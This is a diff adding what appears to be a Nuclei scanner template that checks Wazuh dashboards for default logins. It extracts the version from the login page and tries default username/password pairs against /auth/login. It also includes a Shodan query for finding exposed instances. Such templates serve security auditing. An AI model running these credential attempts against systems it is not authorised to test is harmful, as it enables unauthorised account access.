@@ -1,0 +1,76 @@
+http:
+- extractors:
+  - group: 1
+    internal: true
+    name: osd
+    part: body
+    regex:
+    - '&quot;version&quot;:&quot;([0-9.]+)&quot;'
+    type: regex
+  method: GET
+  path:
+  - '{{BaseURL}}/app/login'
+- attack: clusterbomb
+  matchers:
+  - condition: and
+    part: body
+    type: word
+    words:
+    - '"username":'
+    - '"roles":'
+  - condition: and
+    part: header
+    type: word
+    words:
+    - application/json
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  payloads:
+    password:
+    - admin
+    - wazuh
+    - SecretPassword
+    username:
+    - admin
+    - wazuh
+  raw:
+  - 'POST /auth/login HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Osd-Version: {{osd}}
+
+    osd-xsrf: osd-fetch
+
+    Content-Type: application/json
+
+
+    {"username":"{{username}}","password":"{{password}}"}
+
+    '
+  stop-at-first-match: true
+id: wazuh-default-login
+info:
+  author: theamanrawat,denandz,PulseSecurity.co.nz
+  classification:
+    cpe: cpe:2.3:a:wazuh:wazuh:*:*:*:*:*:*:*:*
+  description: 'Wazuh contains default credentials. An attacker can obtain access
+    to user accounts and access sensitive information, modify data, and/or execute
+    unauthorized operations.
+
+    '
+  metadata:
+    max-request: 7
+    product: wazuh
+    shodan-query: title:"Wazuh"
+    vendor: wazuh
+    verified: true
+  name: Wazuh - Default Login
+  reference:
+  - https://documentation.wazuh.com/current/user-manual/user-administration/password-management.html
+  - https://wazuh.com
+  - https://documentation.wazuh.com/current/deployment-options/docker/wazuh-container.html#single-node-deployment
+  severity: high
+  tags: wazuh,default-login,vuln
